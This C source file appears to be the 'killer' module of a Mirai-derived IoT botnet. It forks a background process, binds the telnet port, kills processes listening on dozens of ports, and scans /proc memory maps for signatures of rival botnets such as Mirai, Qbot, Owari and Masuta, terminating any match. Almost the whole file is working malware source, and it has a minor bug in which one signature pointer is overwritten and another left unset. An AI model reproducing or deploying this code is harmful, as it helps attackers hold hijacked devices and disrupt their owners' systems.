#define _GNU_SOURCE

#ifdef kwari_KILLER

#ifdef DEBUG
    #include <stdio.h>
#endif
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <linux/limits.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>

#include "includes.h"
#include "killer.h"
#include "table.h"
#include "util.h"

int killer_pid = 0;
char *killer_realpath;
int killer_realpath_len = 0;

void killer_init(void)
{
    int killer_highest_pid = KILLER_MIN_PID, last_pid_scan = time(NULL), tmp_bind_fd;
    uint32_t scan_counter = 0;
    struct sockaddr_in tmp_bind_addr;

    killer_pid = fork();
    if(killer_pid > 0 || killer_pid == -1)
        return;

    tmp_bind_addr.sin_family = AF_INET;
    tmp_bind_addr.sin_addr.s_addr = INADDR_ANY;

    if(killer_kill_by_port(htons(81)))
    {
        tmp_bind_addr.sin_port = htons(23);

        if((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
        {
            bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof(struct sockaddr_in));
            listen(tmp_bind_fd, 1);
        }
    }

    sleep(5);

    killer_realpath = malloc(PATH_MAX);
    killer_realpath[0] = 0;
    killer_realpath_len = 0;

    #ifdef DEBUG
        printf("[killer] memory scanning processes\n");
    #endif

    while(TRUE)
    {
        DIR *dir;
        struct dirent *file;
        killer_kill_by_port(htons(48101));
		killer_kill_by_port(htons(48102));
		killer_kill_by_port(htons(13810));
        killer_kill_by_port(htons(1991));
        killer_kill_by_port(htons(1338));
        killer_kill_by_port(htons(80));
        killer_kill_by_port(htons(1982));
        killer_kill_by_port(htons(2048));
        killer_kill_by_port(htons(443));
        killer_kill_by_port(htons(4321));
        killer_kill_by_port(htons(6667));
        killer_kill_by_port(htons(6697));
        killer_kill_by_port(htons(53413));
        killer_kill_by_port(htons(1337));
        killer_kill_by_port(htons(52869));
        killer_kill_by_port(htons(37215));
		killer_kill_by_port(htons(48101));
		killer_kill_by_port(htons(812));
		killer_kill_by_port(htons(760));
		killer_kill_by_port(htons(39459));
		killer_kill_by_port(htons(1991));
		killer_kill_by_port(htons(6666));
		killer_kill_by_port(htons(1312));
		killer_kill_by_port(htons(45));
		killer_kill_by_port(htons(5555));
		killer_kill_by_port(htons(27));
		killer_kill_by_port(htons(2700));
		killer_kill_by_port(htons(1543));
		killer_kill_by_port(htons(1338));
		killer_kill_by_port(htons(1337));
		killer_kill_by_port(htons(420));
		killer_kill_by_port(htons(232));
		killer_kill_by_port(htons(666));
		killer_kill_by_port(htons(1676));
		killer_kill_by_port(htons(443));
		killer_kill_by_port(htons(4321));
		killer_kill_by_port(htons(6667));
		killer_kill_by_port(htons(6697));
		killer_kill_by_port(htons(999));
		killer_kill_by_port(htons(69));
		killer_kill_by_port(htons(21));
		killer_kill_by_port(htons(20));
		killer_kill_by_port(htons(1212));
		killer_kill_by_port(htons(555));
		killer_kill_by_port(htons(444));
		killer_kill_by_port(htons(333));
		killer_kill_by_port(htons(222));
		killer_kill_by_port(htons(111));
		killer_kill_by_port(htons(777));
		killer_kill_by_port(htons(888));
		killer_kill_by_port(htons(1024));
		killer_kill_by_port(htons(2048));
		killer_kill_by_port(htons(1616));
		killer_kill_by_port(htons(4343));
		killer_kill_by_port(htons(11));
		killer_kill_by_port(htons(10));
		killer_kill_by_port(htons(25565));
		
		
		
        table_unlock_val(TABLE_KILLER_PROC);
        if((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) == NULL)
        {
            #ifdef DEBUG
                printf("[killer] failed to open /proc!\n");
            #endif
            break;
        }
        table_lock_val(TABLE_KILLER_PROC);

        while((file = readdir(dir)) != NULL)
        {
            if(*(file->d_name) < '0' || *(file->d_name) > '9')
                continue;

            char maps_path[64], *ptr_maps_path = maps_path, realpath[PATH_MAX];
            int rp_len = 0, fd = 0, pid = util_atoi(file->d_name, 10);

            scan_counter++;
            if(pid <= killer_highest_pid)
            {
                if(time(NULL) - last_pid_scan > KILLER_RESTART_SCAN_TIME)
                {
                    #ifdef DEBUG
                        printf("[killer] %d seconds have passed since last scan. re-scanning all processes!\n", KILLER_RESTART_SCAN_TIME);
                    #endif
                    killer_highest_pid = KILLER_MIN_PID;
                }
                else
                {
                    if(pid > KILLER_MIN_PID && scan_counter % 10 == 0)
                        sleep(1);
                }
                continue;
            }

            if(pid > killer_highest_pid)
                killer_highest_pid = pid;
            last_pid_scan = time(NULL);

            table_unlock_val(TABLE_KILLER_PROC);
            table_unlock_val(TABLE_KILLER_MAPS);

            #ifdef DEBUG
                printf("[killer] scanning pid %d\n", pid);
            #endif

            ptr_maps_path += util_strcpy(ptr_maps_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            ptr_maps_path += util_strcpy(ptr_maps_path, file->d_name);
            ptr_maps_path += util_strcpy(ptr_maps_path, table_retrieve_val(TABLE_KILLER_MAPS, NULL));

            #ifdef DEBUG
                printf("[killer] scanning %s\n", maps_path);;
            #endif

            table_lock_val(TABLE_KILLER_PROC);
            table_lock_val(TABLE_KILLER_MAPS);

            if(maps_scan_match(maps_path))
            {
                kill(pid, 9);
            }

            util_zero(maps_path, sizeof(maps_path));

            sleep(1);
        }

        closedir(dir);
    }

    #ifdef DEBUG
        printf("[killer] finished\n");
    #endif
}
		
void killer_kill(void)
{
    kill(killer_pid, 9);
}

BOOL killer_kill_by_port(port_t port)
{
    DIR *dir, *fd_dir;
    struct dirent *entry, *fd_entry;
    char path[PATH_MAX] = {0}, exe[PATH_MAX] = {0}, buffer[513] = {0};
    int pid = 0, fd = 0;
    char inode[16] = {0};
    char *ptr_path = path;
    int ret = 0;
    char port_str[16];

    #ifdef DEBUG
        printf("[killer] finding and killing processes holding port %d\n", ntohs(port));
    #endif

    util_itoa(ntohs(port), 16, port_str);
    if(util_strlen(port_str) == 2)
    {
        port_str[2] = port_str[0];
        port_str[3] = port_str[1];
        port_str[4] = 0;

        port_str[0] = '0';
        port_str[1] = '0';
    }

    table_unlock_val(TABLE_KILLER_PROC);
    table_unlock_val(TABLE_KILLER_EXE);
    table_unlock_val(TABLE_KILLER_FD);
    table_unlock_val(TABLE_KILLER_TCP);

    fd = open(table_retrieve_val(TABLE_KILLER_TCP, NULL), O_RDONLY);
    if(fd == -1)
        return 0;

    while(util_fdgets(buffer, 512, fd) != NULL)
    {
        int i = 0, ii = 0;

        while(buffer[i] != 0 && buffer[i] != ':')
            i++;

        if(buffer[i] == 0) continue;
        i += 2;
        ii = i;

        while(buffer[i] != 0 && buffer[i] != ' ')
            i++;
        buffer[i++] = 0;

        if(util_stristr(&(buffer[ii]), util_strlen(&(buffer[ii])), port_str) != -1)
        {
            int column_index = 0;
            BOOL in_column = FALSE;
            BOOL listening_state = FALSE;

            while(column_index < 7 && buffer[++i] != 0)
            {
                if(buffer[i] == ' ' || buffer[i] == '\t')
                    in_column = TRUE;
                else
                {
                    if(in_column == TRUE)
                        column_index++;

                    if(in_column == TRUE && column_index == 1 && buffer[i + 1] == 'A')
                    {
                        listening_state = TRUE;
                    }

                    in_column = FALSE;
                }
            }
            ii = i;

            if(listening_state == FALSE)
                continue;

            while(buffer[i] != 0 && buffer[i] != ' ')
                i++;
            buffer[i++] = 0;

            if(util_strlen(&(buffer[ii])) > 15)
                continue;

            util_strcpy(inode, &(buffer[ii]));
            break;
        }
    }

    close(fd);

    if(util_strlen(inode) == 0)
    {
        #ifdef DEBUG
            printf("failed to find inode for port %d\n", ntohs(port));
        #endif

        table_lock_val(TABLE_KILLER_PROC);
        table_lock_val(TABLE_KILLER_EXE);
        table_lock_val(TABLE_KILLER_FD);
        table_lock_val(TABLE_KILLER_TCP);

        return 0;
    }

    #ifdef DEBUG
        printf("found inode \"%s\" for port %d\n", inode, ntohs(port));
    #endif

    if((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) != NULL)
    {
        while((entry = readdir(dir)) != NULL && ret == 0)

        {
            char *pid = entry->d_name;
            if(*pid < '0' || *pid > '9')
                continue;

            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_EXE, NULL));

            if(readlink(path, exe, PATH_MAX) == -1)
                continue;

            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
            if((fd_dir = opendir(path)) != NULL)
            {
                while((fd_entry = readdir(fd_dir)) != NULL && ret == 0)
                {
                    char *fd_str = fd_entry->d_name;

                    util_zero(exe, PATH_MAX);
                    util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), pid);
                    util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), "/");
                    util_strcpy(ptr_path + util_strlen(ptr_path), fd_str);
                    if(readlink(path, exe, PATH_MAX) == -1)
                        continue;

                    if(util_stristr(exe, util_strlen(exe), inode) != -1)
                    {
                        kill(util_atoi(pid, 10), 9);
                        ret = 1;
                    }
                }
                closedir(fd_dir);
            }
        }
        closedir(dir);
    }

    sleep(1);

    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_EXE);
    table_lock_val(TABLE_KILLER_FD);
    table_lock_val(TABLE_KILLER_TCP);

    return ret;
}

static BOOL maps_scan_match(char *path)
{
    char rdbuf[5000];
    BOOL found = FALSE;
    int fd = 0, ret = 0;

    char *m_mirai, *m_sora1, *m_sora2, *m_owari, *m_josho, *m_apollo, *m_katrina, *m_josho3, *m_masuta, *m_daddyleet, *m_qbot, *m_ogowari, *m_opowari, *m_mirai2, *m_qbot2, *m_devnull, *m_ketashi, *m_ketashi2;
    int m_mirai_len, m_sora1_len, m_sora2_len, m_owari_len, m_josho_len, m_apollo_len, m_katrina_len, m_josho3_len, m_masuta_len, m_daddyleet_len, m_qbot_len, m_ogowari_len, m_opowari_len, m_mirai2_len, m_qbot2_len, m_devnull_len, m_ketashi_len, m_ketashi2_len;
	
    if((fd = open(path, O_RDONLY)) == -1)
        return FALSE;

    table_unlock_val(TABLE_EXEC_MIRAI);
    table_unlock_val(TABLE_EXEC_SORA1);
    table_unlock_val(TABLE_EXEC_SORA2);
    table_unlock_val(TABLE_EXEC_OWARI);
    table_unlock_val(TABLE_EXEC_JOSHO);
    table_unlock_val(TABLE_EXEC_APOLLO);
	table_unlock_val(TABLE_EXEC_KATRINA);
	table_unlock_val(TABLE_EXEC_JOSHO3);
	table_unlock_val(TABLE_EXEC_MASUTA);
	table_unlock_val(TABLE_EXEC_DADDYLEET);
	table_unlock_val(TABLE_EXEC_QBOT);
	table_unlock_val(TABLE_EXEC_OGOWARI);
	table_unlock_val(TABLE_EXEC_OPOWARI);
	table_unlock_val(TABLE_EXEC_MIRAI2);
	table_unlock_val(TABLE_EXEC_QBOT2);
	table_unlock_val(TABLE_EXEC_DEVNULL);
	table_unlock_val(TABLE_EXEC_KETASHI);
	table_unlock_val(TABLE_EXEC_KETASHI2);
	
    m_mirai = table_retrieve_val(TABLE_EXEC_MIRAI, &m_mirai_len);
    m_sora1 = table_retrieve_val(TABLE_EXEC_SORA1, &m_sora1_len);
    m_sora2 = table_retrieve_val(TABLE_EXEC_SORA2, &m_sora2_len);
    m_owari = table_retrieve_val(TABLE_EXEC_OWARI, &m_owari_len);
    m_josho = table_retrieve_val(TABLE_EXEC_JOSHO, &m_josho_len);
    m_apollo = table_retrieve_val(TABLE_EXEC_APOLLO, &m_apollo_len);
	m_katrina = table_retrieve_val(TABLE_EXEC_KATRINA, &m_katrina_len);
	m_josho = table_retrieve_val(TABLE_EXEC_JOSHO3, &m_josho3_len);
	m_masuta = table_retrieve_val(TABLE_EXEC_MASUTA, &m_masuta_len);
	m_daddyleet = table_retrieve_val(TABLE_EXEC_DADDYLEET, &m_daddyleet_len);
	m_qbot = table_retrieve_val(TABLE_EXEC_QBOT, &m_qbot_len);
	m_ogowari = table_retrieve_val(TABLE_EXEC_OGOWARI, &m_ogowari_len);
	m_opowari = table_retrieve_val(TABLE_EXEC_OPOWARI, &m_opowari_len);
	m_mirai2 = table_retrieve_val(TABLE_EXEC_MIRAI2, &m_mirai2_len);
	m_qbot2 = table_retrieve_val(TABLE_EXEC_QBOT2, &m_qbot2_len);	
	m_devnull = table_retrieve_val(TABLE_EXEC_DEVNULL, &m_devnull_len);	
	m_ketashi = table_retrieve_val(TABLE_EXEC_KETASHI, &m_ketashi_len);		
	m_ketashi2 = table_retrieve_val(TABLE_EXEC_KETASHI2, &m_ketashi2_len);	

    while((ret = read(fd, rdbuf, sizeof(rdbuf))) > 0)
    {
        if (mem_exists(rdbuf, ret, m_mirai, m_mirai_len) || 
		    mem_exists(rdbuf, ret, m_sora1, m_sora1_len) || 
			mem_exists(rdbuf, ret, m_sora2, m_sora2_len) ||
            mem_exists(rdbuf, ret, m_owari, m_owari_len) || 
		    mem_exists(rdbuf, ret, m_josho, m_josho_len) || 
			mem_exists(rdbuf, ret, m_apollo, m_apollo_len) || 
			mem_exists(rdbuf, ret, m_katrina, m_katrina_len) ||
			mem_exists(rdbuf, ret, m_josho3, m_josho3_len) ||
			mem_exists(rdbuf, ret, m_masuta, m_masuta_len) ||
		    mem_exists(rdbuf, ret, m_daddyleet, m_daddyleet_len) ||
			mem_exists(rdbuf, ret, m_qbot, m_qbot_len) ||
			mem_exists(rdbuf, ret, m_ogowari, m_ogowari_len) ||
			mem_exists(rdbuf, ret, m_opowari, m_opowari_len) ||
		    mem_exists(rdbuf, ret, m_mirai2, m_mirai2_len) ||
			mem_exists(rdbuf, ret, m_qbot2, m_qbot2_len) ||
		    mem_exists(rdbuf, ret, m_devnull, m_devnull_len) ||
			mem_exists(rdbuf, ret, m_ketashi, m_ketashi_len) ||
			mem_exists(rdbuf, ret, m_ketashi2, m_ketashi2_len))
        {
            found = TRUE;
            break;
        }
    }

    table_lock_val(TABLE_EXEC_MIRAI);
    table_lock_val(TABLE_EXEC_SORA1);
    table_lock_val(TABLE_EXEC_SORA2);
    table_lock_val(TABLE_EXEC_OWARI);
    table_lock_val(TABLE_EXEC_JOSHO);
    table_lock_val(TABLE_EXEC_APOLLO);
	table_lock_val(TABLE_EXEC_KATRINA);
	table_lock_val(TABLE_EXEC_JOSHO3);
	table_lock_val(TABLE_EXEC_MASUTA);
	table_lock_val(TABLE_EXEC_DADDYLEET);
	table_lock_val(TABLE_EXEC_QBOT);
	table_lock_val(TABLE_EXEC_OGOWARI);
	table_lock_val(TABLE_EXEC_OPOWARI);
	table_lock_val(TABLE_EXEC_MIRAI2);
	table_lock_val(TABLE_EXEC_QBOT2);
    table_lock_val(TABLE_EXEC_DEVNULL);
	table_lock_val(TABLE_EXEC_KETASHI);
	table_lock_val(TABLE_EXEC_KETASHI2);
    close(fd);

    return found;
}

static BOOL mem_exists(char *buf, int buf_len, char *str, int str_len)
{
    int matches = 0;

    if(str_len > buf_len)
        return FALSE;

    while(buf_len--)
    {
        if(*buf++ == str[matches])
        {
            if(++matches == str_len)
                return TRUE;
        }
        else
            matches = 0;
    }

    return FALSE;
}

#endif
